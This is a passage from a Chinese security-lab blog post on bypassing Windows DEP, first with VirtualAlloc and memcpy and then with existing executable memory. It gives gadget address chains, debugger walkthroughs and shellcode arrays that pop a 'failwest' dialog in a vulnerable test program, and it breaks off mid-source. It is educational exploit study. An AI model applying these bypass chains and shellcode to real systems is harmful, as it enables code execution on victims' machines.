技术，利用 VirtualAlloc 函数申请一段具有执行权限的内存。<br>（ 4）通过 memcpy 函数将 shellcode 复制到 VirtualAlloc 函数申请的可执行内存空间中。<br>（ 5）最后在这段可执行的内存空间中执行 shellcode，实现 DEP 的绕过。</p><table><thead><tr><th>推荐使用的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>Windows 2003 SP2</td></tr><tr><td>DEP 状态</td><td>Optout</td></tr><tr><td>编译器</td><td>VC++ 6.0</td></tr><tr><td>编译选项</td><td>禁用优化选项</td></tr><tr><td>build 版本</td><td>release 版本</td></tr></tbody></table><h4 id="实验步骤-3"><a class="markdownIt-Anchor" href="#实验步骤-3"></a> 实验步骤：</h4><p><strong>（ 1）先修复 EBP（把 ESP赋值给 EBP），并布置参数</strong></p><p>用 PUSH ESP POP EBP RETN 4 指令的地址覆盖 test 函数的返回地址，然后按照以上参数布置一个能够申请可执行内存空间的 shellcode。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;……&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP retn 4</span></span><br><span class="line">    <span class="string">&quot;\xBC\x45\x82\x7C&quot;</span><span class="comment">//CALL VirtualAllocEx 地址</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\xFF\xFF\xFF&quot;</span><span class="comment">//-1 当前进程</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//申请空间起始地址 0x00030000</span></span><br><span class="line">    <span class="string">&quot;\xFF\x00\x00\x00&quot;</span><span class="comment">//申请空间大小 0xFF</span></span><br><span class="line">    <span class="string">&quot;\x00\x10\x00\x00&quot;</span><span class="comment">//申请类型 0x1000</span></span><br><span class="line">    <span class="string">&quot;\x40\x00\x00\x00&quot;</span><span class="comment">//申请空间访问类型 0x40</span></span><br><span class="line">    ;</span><br></pre></td></tr></table></figure><p>调试程序，在 0x7CBBD9BA（调整 EBP 入口）处下断点，然后按 F8 键单步运行到 0x7C8245C2（ VirtualAlloc 函数的 RETN 0x10）暂停，观察内存状态。EAX 中是我们申请空间的起始地址0x00030000，说明我们的空间申请成功了，此时通过 OllyDbg 的内存窗口也可以看到我们刚刚申请的空间，而且属性是带 E 的标志！</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626140259166-165629394983527.png" alt="image-20220626140259166"></p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626134703731-165629394983528.png" alt="image-20220626134703731"></p><p><strong>（ 2）把 shellcode 复制到刚申请的内存空间中</strong></p><p>用位于 ntdll.dll 中的 memcpy 函数进行复制，它需要三个参数，依次为<strong>目的内存起始地址</strong>、<strong>源内存起始地址</strong>、<strong>复制长度</strong>，其中目的内存起始地址和复制长度都可以直接写在 shellcode 中，唯一的难点在于对源内存起始地址的确定。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626155811489-165629394983529.png" alt="image-20220626155811489"></p><p>实际上我们不需要精确的定位，只要<strong>保证源内存起始地址在 shellcode 中关键代码的前边</strong>即可，因此可以使用 PUSH ESP JMP EAX 指令来填充这个参数。</p><p>另外一个需要注意的问题，<strong>在空间申请后 EBP 被设置成 0x00000000</strong>，而后边我们还会再用到 EBP，所以还需要<strong>修复 EBP</strong>。 最后还需要注意 VirtualAlloc 函数返回时带有 16（ 0x10）个字节的偏移，要在 shellcode 中要添加相应的填充。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;……&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP retn 4</span></span><br><span class="line">    <span class="string">&quot;\xBC\x45\x82\x7C&quot;</span><span class="comment">//CALL VirtualAllocEx 地址</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\xFF\xFF\xFF&quot;</span><span class="comment">//-1 当前进程</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//申请空间起始地址 0x00030000</span></span><br><span class="line">    <span class="string">&quot;\xFF\x00\x00\x00&quot;</span><span class="comment">//申请空间大小 0xFF</span></span><br><span class="line">    <span class="string">&quot;\x00\x10\x00\x00&quot;</span><span class="comment">//申请类型 0x1000</span></span><br><span class="line">    <span class="string">&quot;\x40\x00\x00\x00&quot;</span><span class="comment">//申请空间访问类型 0x40</span></span><br><span class="line">    </span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8A\x17\x84\x7C&quot;</span><span class="comment">//pop eax retn</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span><span class="comment">//EAX 指向的指令暂时先用\x90 填充</span></span><br><span class="line">    <span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP</span></span><br><span class="line">    ;</span><br></pre></td></tr></table></figure><p>运行调试，在第二次修复 EBP 的 retn 4 处暂停，此时 EBP=ESP=0x0012FEA4，而 memcpy 中的源内存地址参数位于 EBP+0x0C（0x0012FEB0），如果我们要使用 PUSH ESP 的方式设置源内存地址，就需要让 ESP 指向 EBP+0x10（0x0012FEB4），这样执行完 PUSH 操作后 ESP 的值刚好放在 EBP+0x0C。为了达到这个目的有两个问题需要解决： <strong>ESP 如何指向 EBP+0x10</strong> 和 <strong>PUSH ESP 操作后程序控制权如何回收。</strong></p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626161001067-165629394983631.png" alt="image-20220626161001067"></p><ol><li>先来解决第一个问题。当执行完 retn 4 后，ESP 指向 EBP+0x8 位置，现在要想 ESP 指向 EBP+0x10 就只需要再执行一条 pop retn 指令。在当前 EBP 的位置放置 POP ECX RETN（地址为 0x7CA6785F）。</li><li>再来解决第二个问题。在执行完 PUSH 操作后收回程序控制权的最佳位置在 EBP+0x14，因为在这个位置执行 RETN 指令既保证了 memcpy 参数不被破坏，又可以减小 shellcode 长度。故在执行完 PUSH 操作后我们只需要 POP 两次就可以让 ESP 指向 EBP+0x14，所以 JMP EAX指令中的 EAX 只要指向类似 POP POP RETN 指令即可。然后在 EBP+0x14 位置放置 memcpy函数的切入点 0x7C94AFAC（ MOV ESI,DWORD PTR SS:[EBP+C]），这样程序在执行类似 POP POP RETN 指令中 RETN 时就可以转入 memcpy 函数中执行复制操作了。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;……&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP retn 4</span></span><br><span class="line">    <span class="string">&quot;\xBC\x45\x82\x7C&quot;</span><span class="comment">//CALL VirtualAllocEx 地址</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\xFF\xFF\xFF&quot;</span><span class="comment">//-1 当前进程</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//申请空间起始地址 0x00030000</span></span><br><span class="line">    <span class="string">&quot;\xFF\x00\x00\x00&quot;</span><span class="comment">//申请空间大小 0xFF</span></span><br><span class="line">    <span class="string">&quot;\x00\x10\x00\x00&quot;</span><span class="comment">//申请类型 0x1000</span></span><br><span class="line">    <span class="string">&quot;\x40\x00\x00\x00&quot;</span><span class="comment">//申请空间访问类型 0x40</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8A\x17\x84\x7C&quot;</span><span class="comment">//pop eax retn</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x0B\x1A\xBF\x7C&quot;</span><span class="comment">//pop pop retn</span></span><br><span class="line">    <span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP retn4</span></span><br><span class="line">    <span class="string">&quot;\x5F\x78\xA6\x7C&quot;</span><span class="comment">//pop retn</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//可执行内存空间地址</span></span><br><span class="line">    <span class="string">&quot;\xBF\x7D\xC9\x77&quot;</span><span class="comment">//push esp jmp eax &amp;&amp; 原始 shellcode 起始地址</span></span><br><span class="line">    <span class="string">&quot;\xFF\x00\x00\x00&quot;</span><span class="comment">//shellcode 长度</span></span><br><span class="line">    <span class="string">&quot;\xAC\xAF\x94\x7C&quot;</span><span class="comment">//memcpy 函数切入点;</span></span><br><span class="line">    ;</span><br></pre></td></tr></table></figure><p>运行调试，在 memcpy 函数复制结束返回前暂停，此时 ESP=0x0012FEA8，位于 shellcode 中，并且这里只是放置了填充符。它位于 pop pop retn 指令地址和 memcpy 参数之间，并且紧挨着 memcpy 第一个参数。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626165428530-165629394983530.png" alt="image-20220626165428530"></p><p>接下来，只要在这个位置（0x0012FEA8）填上申请的可执行内存空间起始地址（0x00030000），就能转入该区域执行。</p><p>由上图可知，复制的源内存地址为 0x0012FEB4，就是 memcpy 函数的复制长度参数所在位置，所以只要在它后面接弹出对话框的机器码就行了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;……&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP retn 4</span></span><br><span class="line">    <span class="string">&quot;\xBC\x45\x82\x7C&quot;</span><span class="comment">//CALL VirtualAllocEx 地址</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\xFF\xFF\xFF&quot;</span><span class="comment">//-1 当前进程</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//申请空间起始地址 0x00030000</span></span><br><span class="line">    <span class="string">&quot;\xFF\x00\x00\x00&quot;</span><span class="comment">//申请空间大小 0xFF</span></span><br><span class="line">    <span class="string">&quot;\x00\x10\x00\x00&quot;</span><span class="comment">//申请类型 0x1000</span></span><br><span class="line">    <span class="string">&quot;\x40\x00\x00\x00&quot;</span><span class="comment">//申请空间访问类型 0x40</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8A\x17\x84\x7C&quot;</span><span class="comment">//pop eax retn</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x0B\x1A\xBF\x7C&quot;</span><span class="comment">//pop pop retn</span></span><br><span class="line">    <span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP retn4</span></span><br><span class="line">    <span class="string">&quot;\x5F\x78\xA6\x7C&quot;</span><span class="comment">//pop retn</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//可执行内存空间地址</span></span><br><span class="line">    <span class="string">&quot;\xBF\x7D\xC9\x77&quot;</span><span class="comment">//push esp jmp eax &amp;&amp; 原始 shellcode 起始地址</span></span><br><span class="line">    <span class="string">&quot;\xFF\x00\x00\x00&quot;</span><span class="comment">//shellcode 长度</span></span><br><span class="line">    <span class="string">&quot;\xAC\xAF\x94\x7C&quot;</span><span class="comment">//memcpy 函数切入点;</span></span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line">    <span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line">    <span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line">    <span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line">    <span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line">    <span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line">    <span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span></span><br><span class="line">    ;</span><br></pre></td></tr></table></figure><p>运行结果，并没有弹出我们预想的 ”failwest“ 对话框。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626170404322-165629394983632.png" alt="image-20220626170404322"></p><p>因为memcpy 函数复制过来的不只是弹出对话框的机器码，还包含着弹出对话框机器码前面的一些指令和参数，而这些东西会破坏程序的执行。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626172315190-165629394983633.png" alt="image-20220626172315190"></p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626170532058-165629394983634.png" alt="image-20220626170532058"></p><p>最终 shellcode 如下所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;……&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP retn 4</span></span><br><span class="line">    <span class="string">&quot;\xBC\x45\x82\x7C&quot;</span><span class="comment">//CALL VirtualAllocEx 地址</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\xFF\xFF\xFF&quot;</span><span class="comment">//-1 当前进程</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//申请空间起始地址 0x00030000</span></span><br><span class="line">    <span class="string">&quot;\xFF\x00\x00\x00&quot;</span><span class="comment">//申请空间大小 0xFF</span></span><br><span class="line">    <span class="string">&quot;\x00\x10\x00\x00&quot;</span><span class="comment">//申请类型 0x1000</span></span><br><span class="line">    <span class="string">&quot;\x40\x00\x00\x00&quot;</span><span class="comment">//申请空间访问类型 0x40</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8A\x17\x84\x7C&quot;</span><span class="comment">//pop eax retn</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x0B\x1A\xBF\x7C&quot;</span><span class="comment">//pop pop retn</span></span><br><span class="line">    <span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP retn4</span></span><br><span class="line">    <span class="string">&quot;\x5F\x78\xA6\x7C&quot;</span><span class="comment">//pop retn</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//可执行内存空间地址，转入执行用</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//可执行内存空间地址，复制用</span></span><br><span class="line">    <span class="string">&quot;\xBF\x7D\xC9\x77&quot;</span><span class="comment">//push esp jmp eax &amp;&amp; 原始 shellcode 起始地址</span></span><br><span class="line">    <span class="string">&quot;\xFF\x00\x00\x00&quot;</span><span class="comment">//shellcode 长度</span></span><br><span class="line">    <span class="string">&quot;\xAC\xAF\x94\x7C&quot;</span><span class="comment">//memcpy</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//一个可以读地址</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//一个可以读地址</span></span><br><span class="line">    <span class="string">&quot;\x00\x90\x90\x94&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;……&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span>;</span><br></pre></td></tr></table></figure><p>首先是对 ESI 和 EDI 指向内存的操作，在 0x00030004 和 0x00030005 分别对 ESI 和 EDI 指向的内存有读取操作，我们需要保证 ESI 和 EDI 指向合法的位置。 ESI 和 EDI 是在 memcpy 函数返回前被 POP 进去的。</p><p>接下来是 0x00030006 的 XCHG EAX,EBP 指令，这条指令直接破坏了 ESP，而在弹出对话框的机器码中有 PUSH 操作，所以 ESP 要修复，故我们在弹出对话框的机器码前边使用 0x94 填充，在 0x00030013 处来修复这个问题。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626180652350-165629394983935.png" alt="image-20220626180652350"></p><p>最后是 0x0003000F 的对[EAX]操作，如果 0x00030010 处使用 0x90 填充，结果就是对[EAX+0x909094FC]操作，这会引发异常，所以我们使用 0x00 填充 0x00030010，避免出现异常。</p><blockquote><p>实际上我们有种更简单的方法来处理掉这些垃圾指令，从上图中大家可以看到我们弹出对话框的机器码起始地址为 0x00030008，我们可以让 memcpy 函数返回时直接跳转到这个位置，跃过前边的垃圾指令。</p></blockquote><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626180928314-165629394984036.png" alt="image-20220626180928314"></p><h1 id="利用可执行内存挑战-dep"><a class="markdownIt-Anchor" href="#利用可执行内存挑战-dep"></a> 利用可执行内存挑战 DEP</h1><p>有的时候在进程的内存空间中会存在一段可读可写可执行的内存，如果我们能够将 shellcode 复制到这段内存中，并劫持程序流程，我们的 shellcode 就有执行的机会。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626181911817-165629394984037.png" alt="image-20220626181911817"></p><p>这个实验与上一节的利用 VirtualAlloc 相似，只不过这次实验利用的是已经存在的可读可写可执行的内存空间，而上一节的实验是我们利用的是通过 VirtualAlloc() 函数创造的内存空间。所以这个实验与上一节实验基本相同，在此就不过多介绍。</p><h2 id="源码"><a class="markdownIt-Anchor" href="#源码"></a> 源码：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8A\x17\x84\x7C&quot;</span><span class="comment">//pop eax retn</span></span><br><span class="line">    <span class="string">&quot;\x0B\x1A\xBF\x7C&quot;</span><span class="comment">//pop pop retn</span></span><br><span class="line">    <span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP retn 4</span></span><br><span class="line">    <span class="string">&quot;\x5F\x78\xA6\x7C&quot;</span><span class="comment">//pop retn</span></span><br><span class="line">    <span class="string">&quot;\x08\x00\x14\x00&quot;</span><span class="comment">//可执行内存中弹出对话框机器码的起始地址</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x14\x00&quot;</span><span class="comment">//可执行内存空间地址，复制用</span></span><br><span class="line">    <span class="string">&quot;\xBF\x7D\xC9\x77&quot;</span><span class="comment">//push esp jmp eax &amp;&amp; 原始 shellcode 起始地址</span></span><br><span class="line">    <span class="string">&quot;\xFF\x00\x00\x00&quot;</span><span class="comment">//shellcode 长度</span></span><br><span class="line">    <span class="string">&quot;\xAC\xAF\x94\x7C&quot;</span><span class="comment">//memcpy</span></span><br><span class="line">    <span 